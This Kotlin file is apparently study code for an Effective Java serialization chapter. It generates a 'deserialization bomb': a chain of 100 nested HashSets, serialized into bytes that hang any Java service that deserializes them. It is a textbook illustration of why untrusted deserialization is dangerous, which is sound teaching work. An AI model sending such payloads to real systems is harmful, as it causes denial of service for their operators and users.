package com.example.effectivejava.eleven

import org.springframework.util.SerializationUtils.serialize

class DeserializationBomb {

    companion object {

        fun bomb(): ByteArray? {
            val root = HashSet<Any>()
            var s1 = root
            var s2 = HashSet<Any>()

            repeat((0 until 100).count()) {
                val t1 = HashSet<Any>()
                val t2 = HashSet<Any>()

                t1.add("foo") // t1과 t2를 다르게 만든다.

                s1.add(t1)
                s1.add(t2)

                s2.add(t1)
                s2.add(t2)

                s1 = t1
                s2 = t2
            }

            return serialize(root)
        }

    }

}

fun main() {
    DeserializationBomb.bomb()
}